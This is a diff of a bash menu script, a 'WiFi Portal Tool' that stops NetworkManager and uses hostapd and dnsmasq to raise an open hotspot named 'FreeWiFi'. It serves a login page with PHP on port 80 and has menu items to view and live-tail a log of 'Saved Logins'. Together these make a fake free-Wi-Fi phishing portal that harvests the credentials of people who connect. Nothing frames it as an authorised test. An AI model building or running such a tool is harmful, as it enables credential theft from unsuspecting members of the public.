@@ -1,147 +1,150 @@
 #!/bin/bash
 
+IFACE="wlp4s0"
+SSID="FreeWiFi"
 PORTAL_DIR="portal"
 LOG_FILE="logs/log.txt"
-HOTSPOT_IFACE="wlp4s0"
-INTERNET_IFACE=""  # Leave empty for hotspot-only
-SSID="FreeWiFi"
+
+HOSTAPD_CONF="/tmp/hostapd.conf"
+DNSMASQ_CONF="/tmp/dnsmasq.conf"
 
 # ---------------------------
-# Check if create_ap is installed
+# Setup
 # ---------------------------
-check_create_ap() {
-    if ! command -v create_ap >/dev/null 2>&1; then
-        echo "[-] create_ap is not installed!"
-        echo "Install it first: https://github.com/oblique/create_ap"
-        exit 1
-    fi
+setup() {
+    echo "[+] Setting up..."
+    mkdir -p "$PORTAL_DIR" logs
+    touch "$LOG_FILE"
+    chmod 666 "$LOG_FILE"
+
+    sudo apt update
+    sudo apt install hostapd dnsmasq php-cli -y
+
+    echo "[+] Setup done!"
 }
 
 # ---------------------------
-# Start open hotspot
+# Create configs
+# ---------------------------
+create_configs() {
+
+cat > $HOSTAPD_CONF <<EOF
+interface=$IFACE
+driver=nl80211
+ssid=$SSID
+hw_mode=g
+channel=6
+auth_algs=1
+ignore_broadcast_ssid=0
+EOF
+
+cat > $DNSMASQ_CONF <<EOF
+interface=$IFACE
+dhcp-range=192.168.4.2,192.168.4.50,255.255.255.0,12h
+EOF
+
+}
+
+# ---------------------------
+# Start hotspot
 # ---------------------------
 start_hotspot() {
-    if pgrep create_ap >/dev/null 2>&1; then
-        echo "[!] Hotspot already running."
-        return
-    fi
-    echo "[+] Starting open hotspot on $HOTSPOT_IFACE..."
-    sudo create_ap --no-virt "$HOTSPOT_IFACE" "$INTERNET_IFACE" "$SSID" "" -B
-    sleep 2
-    if pgrep create_ap >/dev/null 2>&1; then
-        echo "[+] Hotspot started successfully!"
-    else
-        echo "[-] Failed to start hotspot. Check your Wi-Fi interface and driver."
-    fi
+    echo "[+] Starting hotspot..."
+
+    sudo systemctl stop NetworkManager
+    sudo systemctl stop wpa_supplicant
+
+    sudo ip link set $IFACE down
+    sudo ip addr flush dev $IFACE
+    sudo ip addr add 192.168.4.1/24 dev $IFACE
+    sudo ip link set $IFACE up
+
+    create_configs
+
+    sudo hostapd $HOSTAPD_CONF -B
+    sudo dnsmasq -C $DNSMASQ_CONF
+
+    echo "[+] Hotspot started: $SSID"
 }
 
 # ---------------------------
 # Stop hotspot
 # ---------------------------
 stop_hotspot() {
-    if pgrep create_ap >/dev/null 2>&1; then
-        sudo pkill create_ap
-        echo "[+] Hotspot stopped."
-    else
-        echo "[!] No hotspot is running."
-    fi
+    echo "[+] Stopping hotspot..."
+
+    sudo pkill hostapd
+    sudo pkill dnsmasq
+
+    sudo systemctl start NetworkManager
+
+    echo "[+] Stopped."
 }
 
 # ---------------------------
-# Show connected devices
-# ---------------------------
-show_connected_devices() {
-    echo "[+] Connected devices (ARP table):"
-    arp -n | grep -v "incomplete"
-}
-
-# ---------------------------
-# Start login page server
+# Start portal server
 # ---------------------------
 start_server() {
-    if [ ! -d "$PORTAL_DIR" ]; then
-        echo "[-] Portal directory '$PORTAL_DIR' does not exist!"
-        return
-    fi
-    echo "[+] Starting login page server..."
+    echo "[+] Starting portal..."
     cd "$PORTAL_DIR" || exit
-    php -S 0.0.0.0:8080
+    php -S 0.0.0.0:80
 }
 
 # ---------------------------
-# View saved logins
+# Show devices
+# ---------------------------
+show_devices() {
+    echo "[+] Connected devices:"
+    cat /var/lib/misc/dnsmasq.leases 2>/dev/null
+}
+
+# ---------------------------
+# Logs
 # ---------------------------
 view_logs() {
-    echo "---- Saved Logins ----"
-    if [ -f "$LOG_FILE" ]; then
-        cat "$LOG_FILE"
-    else
-        echo "No logs yet."
-    fi
-    echo "----------------------"
+    echo "---- Logins ----"
+    cat "$LOG_FILE"
 }
 
-# ---------------------------
-# Live logs
-# ---------------------------
 live_logs() {
-    echo "[+] Live log view (Ctrl+C to exit)"
-    [ ! -f "$LOG_FILE" ] && touch "$LOG_FILE"
     tail -f "$LOG_FILE"
 }
 
 # ---------------------------
-# Edit login page
+# Edit page
 # ---------------------------
 edit_page() {
-    if [ ! -f "$PORTAL_DIR/index.html" ]; then
-        echo "[-] Login page does not exist!"
-        return
-    fi
     nano "$PORTAL_DIR/index.html"
 }
 
 # ---------------------------
-# Setup folders/files
+# Menu
 # ---------------------------
-setup() {
-    echo "[+] Setting up folders..."
-    mkdir -p "$PORTAL_DIR" logs
-    touch "$LOG_FILE"
-    chmod 666 "$LOG_FILE"
-    echo "[+] Setup complete!"
-}
-
-# ---------------------------
-# Main Menu
-# ---------------------------
-check_create_ap
-
 while true; do
     echo ""
     echo "====== WiFi Portal Tool ======"
-    echo "1) Setup (first time)"
-    echo "2) Start Open Hotspot"
+    echo "1) Setup"
+    echo "2) Start Hotspot"
     echo "3) Stop Hotspot"
-    echo "4) Show Connected Devices"
-    echo "5) Start Login Page Server"
-    echo "6) View Saved Logins"
-    echo "7) Live View Logs"
-    echo "8) Edit Login Page"
+    echo "4) Start Login Page"
+    echo "5) Show Devices"
+    echo "6) View Logs"
+    echo "7) Live Logs"
+    echo "8) Edit Page"
     echo "9) Exit"
     echo "=============================="
-    read -p "Select option: " choice
+    read -p "Select: " choice
 
     case $choice in
         1) setup ;;
         2) start_hotspot ;;
         3) stop_hotspot ;;
-        4) show_connected_devices ;;
-        5) start_server ;;
+        4) start_server ;;
+        5) show_devices ;;
         6) view_logs ;;
         7) live_logs ;;
         8) edit_page ;;
-        9) echo "Exiting..."; exit ;;
-        *) echo "Invalid option" ;;
+        9) exit ;;
+        *) echo "Invalid" ;;
     esac
 done
